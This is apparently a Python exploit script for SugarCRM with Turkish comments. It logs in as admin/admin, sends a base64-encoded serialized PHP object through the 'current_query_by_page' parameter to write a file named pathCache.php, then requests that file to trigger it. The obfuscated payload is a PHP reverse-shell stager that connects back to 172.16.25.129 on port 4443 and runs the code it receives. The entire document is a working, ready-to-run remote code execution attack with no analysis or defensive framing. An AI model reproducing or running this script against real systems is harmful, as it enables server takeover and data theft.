#!/usr/bin/env python

import requests
session = requests.session()

username = "admin"
password = "admin"

URL = 'http://172.16.25.136/sugar/'
Login = {
	'module':'Users',
	'action':'Authenticate',
	'user_name':username,
	'user_password':password
}

#Oturum acma islemi gerceklesiyor
req = requests.session()
r = req.post(URL+"index.php", data=Login)


#Exploit Gonderilme asamasi
Payload = {
	'module':'Contacts',
	'Contacts2_CONTACT_offset':'1',
	'current_query_by_page':'TzoxMDoiU3VnYXJUaGVtZSI6Mjp7czoxMDoiACoAZGlyTmFtZSI7czo2OiIuLi8uLi8iO3M6MjA6IgBTdWdhclRoZW1lAF9qc0NhY2hlIjtzOjE1MzU6Ijw/cGhwIGVycm9yX3JlcG9ydGluZygwKTtldmFsKGJhc2U2NF9kZWNvZGUoTHlvOFAzQm9jQ0F2S2lvdklHVnljbTl5WDNKbGNHOXlkR2x1Wnlnd0tUc2dKR2x3SUQwZ0p6RTNNaTR4Tmk0eU5TNHhNamtuT3lBa2NHOXlkQ0E5SURRME16c2dhV1lnS0Nna1ppQTlJQ2R6ZEhKbFlXMWZjMjlqYTJWMFgyTnNhV1Z1ZENjcElDWW1JR2x6WDJOaGJHeGhZbXhsS0NSbUtTa2dleUFrY3lBOUlDUm1LQ0owWTNBNkx5OTdKR2x3ZlRwN0pIQnZjblI5SWlrN0lDUnpYM1I1Y0dVZ1BTQW5jM1J5WldGdEp6c2dmU0JwWmlBb0lTUnpJQ1ltSUNna1ppQTlJQ2RtYzI5amEyOXdaVzRuS1NBbUppQnBjMTlqWVd4c1lXSnNaU2drWmlrcElIc2dKSE1nUFNBa1ppZ2thWEFzSUNSd2IzSjBLVHNnSkhOZmRIbHdaU0E5SUNkemRISmxZVzBuT3lCOUlHbG1JQ2doSkhNZ0ppWWdLQ1JtSUQwZ0ozTnZZMnRsZEY5amNtVmhkR1VuS1NBbUppQnBjMTlqWVd4c1lXSnNaU2drWmlrcElIc2dKSE1nUFNBa1ppaEJSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnVTA5TVgxUkRVQ2s3SUNSeVpYTWdQU0JBYzI5amEyVjBYMk52Ym01bFkzUW9KSE1zSUNScGNDd2dKSEJ2Y25RcE95QnBaaUFvSVNSeVpYTXBJSHNnWkdsbEtDazdJSDBnSkhOZmRIbHdaU0E5SUNkemIyTnJaWFFuT3lCOUlHbG1JQ2doSkhOZmRIbHdaU2tnZXlCa2FXVW9KMjV2SUhOdlkydGxkQ0JtZFc1amN5Y3BPeUI5SUdsbUlDZ2hKSE1wSUhzZ1pHbGxLQ2R1YnlCemIyTnJaWFFuS1RzZ2ZTQnpkMmwwWTJnZ0tDUnpYM1I1Y0dVcElIc2dZMkZ6WlNBbmMzUnlaV0Z0SnpvZ0pHeGxiaUE5SUdaeVpXRmtLQ1J6TENBMEtUc2dZbkpsWVdzN0lHTmhjMlVnSjNOdlkydGxkQ2M2SUNSc1pXNGdQU0J6YjJOclpYUmZjbVZoWkNna2N5d2dOQ2s3SUdKeVpXRnJPeUI5SUdsbUlDZ2hKR3hsYmlrZ2V5QmthV1VvS1RzZ2ZTQWtZU0E5SUhWdWNHRmpheWdpLlRteGxiaUlzSUNSc1pXNHBPeUFrYkdWdUlEMGdKR0ZiSjJ4bGJpZGRPeUFrWWlBOUlDY25PeUIzYUdsc1pTQW9jM1J5YkdWdUtDUmlLU0E4SUNSc1pXNHBJSHNnYzNkcGRHTm9JQ2drYzE5MGVYQmxLU0I3SUdOaGMyVWdKM04wY21WaGJTYzZJQ1JpSUM0OUlHWnlaV0ZrS0NSekxDQWtiR1Z1TFhOMGNteGxiaWdrWWlrcE95QmljbVZoYXpzZ1kyRnpaU0FuYzI5amEyVjBKem9nSkdJZ0xqMGdjMjlqYTJWMFgzSmxZV1FvSkhNc0lDUnNaVzR0YzNSeWJHVnVLQ1JpS1NrN0lHSnlaV0ZyT3lCOUlIMGdKRWRNVDBKQlRGTmJKMjF6WjNOdlkyc25YU0E5SUNSek95QWtSMHhQUWtGTVUxc25iWE5uYzI5amExOTBlWEJsSjEwZ1BTQWtjMTkwZVhCbE95QnBaaUFvWlhoMFpXNXphVzl1WDJ4dllXUmxaQ2duYzNWb2IzTnBiaWNwSUNZbUlHbHVhVjluWlhRb0ozTjFhRzl6YVc0dVpYaGxZM1YwYjNJdVpHbHpZV0pzWlY5bGRtRnNKeWtwSUhzZ0pITjFhRzl6YVc1ZllubHdZWE56UFdOeVpXRjBaVjltZFc1amRHbHZiaWduSnl3Z0pHSXBPeUFrYzNWb2IzTnBibDlpZVhCaGMzTW9LVHNnZlNCbGJITmxJSHNnWlhaaGJDZ2tZaWs3SUgwZ1pHbGxLQ2s3KSk7ID8+Ijt9'
}

r = requests.post(URL+"index.php", cookies=req.cookies, data=Payload, headers={"content-type":"application/x-www-form-urlencoded"});

#Exploit Tetiklenme asamasi

trigger = requests.get(URL+"pathCache.php", cookies=req.cookies)


